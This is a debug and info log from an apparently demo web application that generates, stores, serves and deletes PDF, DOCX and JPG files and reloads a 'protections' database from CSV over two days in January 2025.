2025-01-21 20:57:48 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:57:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:57:50 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 20:57:50 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 20:57:50 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 20:57:50 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_2382.pdf' deleted from filesystem.
2025-01-21 20:57:50 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 20:57:50 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:57:50 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:57:50 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:58:19 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_9154.pdf
2025-01-21 20:58:19 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_9154.pdf' saved successfully.
2025-01-21 20:58:19 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:58:19 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:58:19 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:58:19 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:58:19 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:58:21 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_9154.pdf with MIME type: application/pdf
2025-01-21 20:58:44 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_9154.pdf
2025-01-21 20:58:44 - INFO - delete_generated_file:564 - File 'generated_pdf_file_9154.pdf' deleted from database.
2025-01-21 20:58:44 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-21 20:58:44 - INFO - delete_generated_file:578 - File 'generated_pdf_file_9154.pdf' deleted from filesystem.
2025-01-21 20:58:44 - INFO - delete_file:297 - Deleted file: generated_pdf_file_9154.pdf
2025-01-21 20:58:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:58:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:58:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:58:55 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_2335.pdf
2025-01-21 20:58:55 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_2335.pdf' saved successfully.
2025-01-21 20:58:55 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:58:55 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:58:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:58:55 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:58:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:58:56 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_2335.pdf with MIME type: application/pdf
2025-01-21 20:59:35 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 20:59:35 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 20:59:35 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 20:59:35 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_2335.pdf' deleted from filesystem.
2025-01-21 20:59:35 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 20:59:35 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:59:35 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:59:35 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:59:41 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_6864.pdf
2025-01-21 20:59:41 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_6864.pdf' saved successfully.
2025-01-21 20:59:41 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:59:41 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:59:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:59:42 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:59:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:59:43 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_6864.pdf with MIME type: application/pdf
2025-01-21 21:01:15 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 21:01:15 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 21:01:15 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 21:01:15 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_6864.pdf' deleted from filesystem.
2025-01-21 21:01:15 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 21:01:15 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 21:01:15 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 21:01:15 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 21:01:43 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_9540.pdf
2025-01-21 21:01:43 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_9540.pdf' saved successfully.
2025-01-21 21:01:43 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 21:01:43 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 21:01:43 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 21:01:43 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 21:01:43 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 21:01:44 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_9540.pdf with MIME type: application/pdf
2025-01-21 21:02:40 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 21:02:40 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 21:02:40 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 21:02:40 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_9540.pdf' deleted from filesystem.
2025-01-21 21:02:40 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_9412.jpg' deleted from filesystem.
2025-01-21 21:02:40 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 21:02:40 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 21:02:40 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 21:02:40 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 21:02:48 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_2056.docx
2025-01-21 21:02:48 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_2056.docx' saved successfully.
2025-01-21 21:02:48 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 21:02:48 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-21 21:02:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 21:02:48 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 21:02:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 21:02:50 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_2056.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-21 21:04:00 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 21:04:00 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 21:04:00 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 21:04:00 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_8925.jpg' deleted from filesystem.
2025-01-21 21:04:00 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_2056.docx' deleted from filesystem.
2025-01-21 21:04:00 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 21:04:00 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 21:04:00 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 21:04:00 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:24:00 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_5617.docx
2025-01-22 11:24:00 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_5617.docx' saved successfully.
2025-01-22 11:24:00 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:24:00 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 11:24:00 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:24:00 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:24:00 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:24:03 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_5617.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 11:24:51 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_docx_file_5617.docx
2025-01-22 11:24:51 - INFO - delete_generated_file:564 - File 'generated_docx_file_5617.docx' deleted from database.
2025-01-22 11:24:51 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 11:24:51 - INFO - delete_generated_file:578 - File 'generated_docx_file_5617.docx' deleted from filesystem.
2025-01-22 11:24:51 - INFO - delete_file:297 - Deleted file: generated_docx_file_5617.docx
2025-01-22 11:24:51 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:24:51 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:24:51 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:24:58 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_8394.docx
2025-01-22 11:24:58 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_8394.docx' saved successfully.
2025-01-22 11:24:58 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:24:58 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 11:24:58 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:24:58 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:24:58 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:24:59 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_8394.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 11:25:31 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:25:31 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:25:31 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:25:31 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_2184.jpg' deleted from filesystem.
2025-01-22 11:25:31 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_8394.docx' deleted from filesystem.
2025-01-22 11:25:31 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:25:31 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:25:31 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:25:31 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:25:38 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_3834.docx
2025-01-22 11:25:38 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_3834.docx' saved successfully.
2025-01-22 11:25:38 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:25:38 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 11:25:38 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:25:38 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:25:38 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:25:40 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_3834.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 11:26:32 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_8396.pdf
2025-01-22 11:26:32 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_8396.pdf' saved successfully.
2025-01-22 11:26:32 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:26:32 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 11:26:32 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:26:32 - DEBUG - load_generated_files:499 - Fetched 2 records from 'generated_files' table.
2025-01-22 11:26:32 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:26:35 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_8396.pdf with MIME type: application/pdf
2025-01-22 11:27:06 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:27:06 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:27:06 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:27:06 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_8396.pdf' deleted from filesystem.
2025-01-22 11:27:06 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_3834.docx' deleted from filesystem.
2025-01-22 11:27:06 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:27:06 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:27:06 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:27:06 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:27:10 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_5009.pdf
2025-01-22 11:27:10 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_5009.pdf' saved successfully.
2025-01-22 11:27:10 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:27:10 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 11:27:10 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:27:10 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:27:10 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:27:13 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_5009.pdf with MIME type: application/pdf
2025-01-22 11:27:50 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:27:50 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:27:50 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:27:50 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_5009.pdf' deleted from filesystem.
2025-01-22 11:27:50 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:27:50 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:27:50 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:27:50 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:27:55 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_4888.docx
2025-01-22 11:27:55 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_4888.docx' saved successfully.
2025-01-22 11:27:55 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:27:55 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 11:27:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:27:55 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:27:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:28:02 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_4888.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 11:28:36 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:28:36 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:28:36 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:28:36 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_4888.docx' deleted from filesystem.
2025-01-22 11:28:36 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_8655.jpg' deleted from filesystem.
2025-01-22 11:28:36 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:28:36 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:28:36 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:28:36 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:28:40 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_9851.pdf
2025-01-22 11:28:40 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_9851.pdf' saved successfully.
2025-01-22 11:28:40 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:28:40 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 11:28:40 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:28:40 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:28:40 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:28:42 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_9851.pdf with MIME type: application/pdf
2025-01-22 11:37:25 - INFO - init_db:58 - Initializing protections database.
2025-01-22 11:37:25 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 11:37:25 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-22 11:37:25 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 11:37:25 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 11:37:25 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 11:37:25 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 11:37:25 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 11:37:25 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 11:37:25 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 11:37:25 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 11:37:25 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 11:37:25 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 11:37:25 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 11:37:25 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 11:37:35 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:37:35 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:37:35 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:37:35 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_9851.pdf' deleted from filesystem.
2025-01-22 11:37:35 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_4764.jpg' deleted from filesystem.
2025-01-22 11:37:35 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:37:35 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:37:35 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:37:35 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:37:40 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_4373.pdf
2025-01-22 11:37:40 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_4373.pdf' saved successfully.
2025-01-22 11:37:40 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:37:40 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 11:37:40 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:37:40 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:37:40 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:37:42 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_4373.pdf with MIME type: application/pdf
2025-01-22 11:38:12 - INFO - init_db:58 - Initializing protections database.
2025-01-22 11:38:12 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 11:38:12 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-22 11:38:12 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 11:38:12 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 11:38:12 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 11:38:12 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 11:38:12 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 11:38:12 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 11:38:12 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 11:38:12 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 11:38:12 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 11:38:12 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 11:38:12 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 11:38:12 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 11:38:48 - INFO - init_db:58 - Initializing protections database.
2025-01-22 11:38:48 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 11:38:48 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-22 11:38:48 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 11:38:48 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 11:38:48 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 11:38:48 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 11:38:48 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 11:38:48 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 11:38:48 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 11:38:48 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 11:38:48 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 11:38:48 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 11:38:48 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 11:38:48 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 11:38:56 - INFO - init_db:58 - Initializing protections database.
2025-01-22 11:38:56 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 11:38:56 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-22 11:38:56 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 11:38:56 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 11:38:56 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 11:38:56 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 11:38:56 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 11:38:56 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 11:38:56 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 11:38:56 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 11:38:56 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 11:38:56 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 11:38:56 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 11:38:56 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 11:38:57 - INFO - init_db:58 - Initializing protections database.
2025-01-22 11:38:57 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 11:38:57 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-22 11:38:57 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 11:38:57 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 11:38:57 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 11:38:57 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 11:38:57 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 11:38:57 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 11:38:57 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 11:38:57 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 11:38:57 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 11:38:57 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 11:38:57 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 11:38:57 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 11:39:03 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 11:39:03 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 11:39:03 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 11:39:03 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_4373.pdf' deleted from filesystem.
2025-01-22 11:39:03 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_2222.jpg' deleted from filesystem.
2025-01-22 11:39:03 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 11:39:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:39:03 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 11:39:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:39:08 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_7279.pdf
2025-01-22 11:39:08 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_7279.pdf' saved successfully.
2025-01-22 11:39:08 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 11:39:08 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 11:39:08 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 11:39:08 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 11:39:08 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 11:39:10 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_7279.pdf with MIME type: application/pdf
2025-01-22 12:05:43 - INFO - init_db:58 - Initializing protections database.
2025-01-22 12:05:43 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-22 12:05:43 - DEBUG - init_db:68 - Creating 'protections' table.
